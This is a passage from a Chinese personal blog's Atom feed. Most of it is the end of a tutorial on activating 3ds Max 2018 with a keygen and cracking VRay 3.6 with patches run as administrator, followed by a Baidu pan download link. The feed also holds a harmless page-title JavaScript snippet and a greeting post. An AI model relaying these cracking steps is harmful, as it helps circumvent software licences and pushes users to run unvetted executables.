src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/27.jpg"><ul><li>注册机获取成功之后我们复制申请号，选中申请号按住键盘上的 <strong>Ctrl + C</strong> 复制它.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/28.jpg"><ul><li>把注册机第一个输入框里面的英文删掉，按住键盘上的 <strong>Ctrl + V</strong> 把刚刚复制的申请号粘贴进去.弄好后点击最中间的<strong>Generate</strong>计算出激活码，算出来的激活码会自动写到注册机的第二个框内，我们选中第二个框内所有的字母，按键盘上的 <strong>Ctrl + X</strong> 把它全部剪贴出来，注意不要漏选.</li><li>回到我们的3D Max激活里面，把注册机算出来的激活码填入那些小方格中，在第一个小方格中按住键盘上的 <strong>Ctrl + V</strong> 可一次性将刚刚复制的激活码粘贴进去，填好之后我们点击下一步，然后等待激活即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/29.jpg"><ul><li>出现下图表示激活成功，点击完成即可，这时已经可以关闭注册机了，如果出现激活产品失败请重复上述激活步骤，多试几次即可激活软件.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/30.jpg"><hr><h2 id="VRay-3-6-3D-Max必装渲染器"><a href="#VRay-3-6-3D-Max必装渲染器" class="headerlink" title="VRay 3.6(3D Max必装渲染器)"></a>VRay 3.6(3D Max必装渲染器)</h2><ul><li>首先，把VRay解压至桌面，安装完成之后比较好整理.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/31.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/32.jpg"><ul><li>打开刚刚解压出来的Vray文件夹，得到两个文件夹，分别是Vray 3.6和破解+汉化工具.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/33.jpg"><ul><li>先进入第一个文件夹Vray 3.6 ，里面有一个Vray的安装程序，我们右键管理员身份运行它.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/34.jpg"><ul><li>打开Vray会弹出一个CMD窗口和一个安装窗口，我们不要理会CMD窗口，我们先点击安装窗口右下角的 <strong>l Agree</strong> 按钮.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/35.jpg"><ul><li>然后会出来好几个选项，我们都不要理会，找到<strong>Customize</strong>按钮并点击它.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/36.jpg"><ul><li>出现下图，这里我们需要更改一下他的安装路径，把Vray安装到3D Max所在的那个磁盘里，(如我的3D Max安装在D盘，我的Vray就需要安装到D盘里),注意这里不要更改后面的文件路径，我们把路径开头的字母更改一下就可以了，(比如我需要安装到D盘，直接把路径开头的<strong>C:\</strong>改为<strong>D:\</strong>就可以改到D盘了)，然后我们点击<strong>lnstall Now</strong>进入下一个页面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/37.jpg"><ul><li>这里把默认勾选的那两个选项的勾去掉，然后点击<strong>Finish</strong>开始安装.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/38.jpg"><ul><li>等待安装完成…</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/39.jpg"><ul><li>安装完成后会再次弹出Vray的安装窗口，我们和之前一样，点击 <strong>l Agree</strong> 按钮进入下一步.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/40.jpg"><ul><li>这里点击<strong>Customize</strong>按钮进入配置页面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/41.jpg"><ul><li>这里就不要改了，默认就好，直接点击 <strong>lnstall Now</strong> 按钮开始安装即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/42.jpg"><ul><li>等待安装完成，出现下图界面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/43.jpg"><ul><li>到这里不要再继续操作了，点击右上角的”<strong>X</strong>“选择”<strong>是</strong>“关掉窗口即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/44.jpg"><ul><li>到这里Vray渲染器就算安装完成了.</li></ul><hr><h2 id="Vray破解·汉化"><a href="#Vray破解·汉化" class="headerlink" title="Vray破解·汉化"></a>Vray破解·汉化</h2><ul><li>我们回到Vray破解+汉化的那个文件夹，<strong>右键以管理员身份运行</strong>里面的破解补丁.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/45.jpg"><ul><li>在弹出的窗口内点击下一步，上面的选项不需要修改，直接点击安装即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/46.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/47.jpg"><ul><li>破解完成后我们<strong>右键以管理员身份运行</strong>汉化补丁，选择”<strong>我接受</strong>“进入下一个界面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/48.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/49.jpg"><ul><li>这里会弹出汉化补丁作者的赞助二维码，需要等待30秒才能点击下一步，当然，如果你是个有钱人的话，你在这30秒内也可以选择投喂开发者.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/50.jpg"><ul><li>30秒后点击下一步，进入安装配置界面，这里不需要更改任何选项，直接点击安装等待完成即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/51.jpg"><ul><li>到这里，Vray渲染器已完美破解，在3D Max渲染器设置内即可调出来使用.</li></ul><hr><h2 id="整理安装残留-大佬可以跳过"><a href="#整理安装残留-大佬可以跳过" class="headerlink" title="整理安装残留 (大佬可以跳过)"></a>整理安装残留 (大佬可以跳过)</h2><ul><li>3D max会自动安装一个桌面程序，他是开机自动启动的，为了它不拖慢我们的系统，我们启动任务管理器选择启动一栏，找到下图中的那个程序右键将它禁用掉即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/52.jpg"><ul><li>安装完上述软件会残留下来不少垃圾文件，我们将第一次新建的名为3D Max安装程序的文件夹，从电脑内删除掉.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/53.jpg"><ul><li>将桌面上的注册机等等没用的文件全部清理掉.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/54.jpg"><ul><li>最后清理掉电脑回收站，即可将电脑清理至最佳状态.</li></ul><blockquote><p>弄好后推荐将电脑重启一下再使用哦！</p></blockquote><hr><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><ul><li>软件下载地址：<a href="https://pan.baidu.com/s/1s_Z_kEqbg_YLt6BeKhB8-A" target="_blank" rel="noopener">百度网盘</a></li><li>提取码：<strong>kktz</strong></li><li>不要问为什么是百度网盘，问就是不知道(ˉ▽￣～)<br>我是绝对不会告诉你其实我很穷的Σ(｀д′*ノ)ノ</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;需要资源：&quot;&gt;&lt;a href=&quot;#需要资源：&quot; class=&quot;headerlink&quot; title=&quot;需要资源：&quot;&gt;&lt;/a&gt;需要资源：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;3D Max安装包&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3D Max注册机&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VRay渲染器（3D 必装）&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VRay破解工具&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VRay汉化工具&lt;/strong&gt;&lt;blockquote&gt;
&lt;p&gt;本篇文章以&lt;strong&gt;2018年版&lt;/strong&gt;的&lt;strong&gt;3D Max&lt;/strong&gt;和&lt;strong&gt;VRay 3.6&lt;/strong&gt;为例，在Windows 10系统上进行安装操作，其他版本安装过程可能略有不同。本文仅供参考。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>我藏好了哦</title>
    <link href="https://lovek.me/av3/"/>
    <id>https://lovek.me/av3/</id>
    <published>2019-09-16T16:03:00.000Z</published>
    <updated>2020-01-22T15:20:05.071Z</updated>
    
    <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/3.png">在 Sonic 853 看到的神奇的一幕，一颗赛艇，果断扒来水一贴<a id="more"></a>原作者：<a href="http://chitanda.me/" target="_blank" rel="noopener">成天不高兴的栗山未来</a><p>什么鬼：离开和进入页面时改变title</p><p><strong>原理：</strong></p><p>使用了HTML5的Page Visibility API</p><p>目前页面可见性API有两个属性，一个事件，如下：</p><p>document.hidden: Boolean值，表示当前页面可见还是不可见</p><p>document.visibilityState: 返回当前页面的可见状态，取值有 hidden visible prerender preview</p><p>visibilitychange: 当可见状态改变时候触发的事件</p><p>以前只知道可以通过 iframe + onblur/onfocus事件 来检测页面可见性，有了这个 API 真是方便优雅了很多啊</p><p><strong>代码：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> OriginTitile = <span class="built_in">document</span>.title;</span><br><span class="line">  <span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'visibilitychange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">document</span>.hidden) &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'(つェ⊂)我藏好了哦~ '</span> + OriginTitile;</span><br><span class="line">    clearTimeout(titleTime);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'(*´∇｀*) 被你发现啦~ '</span> + OriginTitile;</span><br><span class="line">    titleTime = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.title = OriginTitile;</span><br><span class="line">       &#125;, <span class="number">2000</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/3.png&quot;&gt;
在 Sonic 853 看到的神奇的一幕，一颗赛艇，果断扒来水一贴
    
    </summary>
    
    
      <category term="分享镜" scheme="https://lovek.me/categories/%E5%88%86%E4%BA%AB%E9%95%9C/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello,World!</title>
    <link href="https://lovek.me/av1/"/>
    <id>https://lovek.me/av1/</id>
    <published>2019-09-15T12:08:00.000Z</published>
    <updated>2020-09-27T08:51:19.220Z</updated>
    
    <content type="html"><![CDATA[<!-- **Hi, I am lovely god.** --><p>你好，世界！<br>当前时间：2019年9月15日<br>从今天开始创作博客！</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;!-- **Hi, I am lovely god.** --&gt;
&lt;p&gt;你好，世界！&lt;br&gt;当前时间：2019年9月15日&lt;br&gt;从今天开始创作博客！&lt;/p&gt;
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
</feed>
